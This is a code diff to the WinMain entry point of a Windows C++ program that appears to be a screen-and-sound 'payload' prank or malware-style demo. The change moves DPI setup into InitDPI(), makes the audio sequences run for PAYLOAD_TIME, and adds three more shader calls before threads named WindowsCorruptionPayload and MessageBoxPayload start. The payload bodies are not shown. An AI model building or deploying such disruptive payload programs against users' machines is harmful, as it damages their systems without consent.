@@ -1,4 +1,12 @@
 #include "payloads.h"
+void InitDPI() {
+	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
+	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
+	if (SetProcessDPIAware) {
+		SetProcessDPIAware();
+	}
+	FreeLibrary(hModUser32);
+}
 int WinMain(
 	_In_ HINSTANCE hInstance,
 	_In_opt_ HINSTANCE hPrevInstance,
@@ -7,20 +15,15 @@ int WinMain(
 ) {
 
 	AUDIO_SEQUENCE_PARAMS pAudioSequences[AUDIO_NUM] = {0};
-	pAudioSequences[0] = { 8000, 8000 * 10, AudioSequence1, NULL, NULL };
-	pAudioSequences[1] = { 8000, 8000 * 10, AudioSequence2, NULL, NULL };
-	pAudioSequences[2] = { 8000, 8000 * 10, AudioSequence3, NULL, NULL };
-	pAudioSequences[3] = { 8000, 8000 * 10, AudioSequence4, NULL, NULL };
-	pAudioSequences[4] = { 8000, 8000 * 10, AudioSequence5, NULL, NULL };
+	pAudioSequences[0] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence1};
+	pAudioSequences[1] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence2};
+	pAudioSequences[2] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence3};
+	pAudioSequences[3] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence4};
+	pAudioSequences[4] = { 8000, 8000 * PAYLOAD_TIME, AudioSequence5};
 
 	SeedXorshift32((DWORD)__rdtsc());
 
-	HMODULE hModUser32 = LoadLibrary(L"user32.dll");
-	BOOL(WINAPI * SetProcessDPIAware)(VOID) = (BOOL(WINAPI*)(VOID))GetProcAddress(hModUser32, "SetProcessDPIAware");
-	if (SetProcessDPIAware) {
-		SetProcessDPIAware();
-	}
-	FreeLibrary(hModUser32);
+	InitDPI();
 
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(AudioPayloadThread), (PVOID)pAudioSequences, 0, NULL);
@@ -45,6 +48,9 @@ int WinMain(
 	ExecuteShader(Shader8, PAYLOAD_TIME);
 	ExecuteShader(Shader9, PAYLOAD_TIME);
 	ExecuteShader(Shader10, PAYLOAD_TIME);
+	ExecuteShader(Shader11, PAYLOAD_TIME);
+	ExecuteShader(Shader12, PAYLOAD_TIME);
+	ExecuteShader(Shader13, PAYLOAD_TIME);
 
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(WindowsCorruptionPayload), NULL, 0, NULL);
 	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(MessageBoxPayload), NULL, 0, NULL);
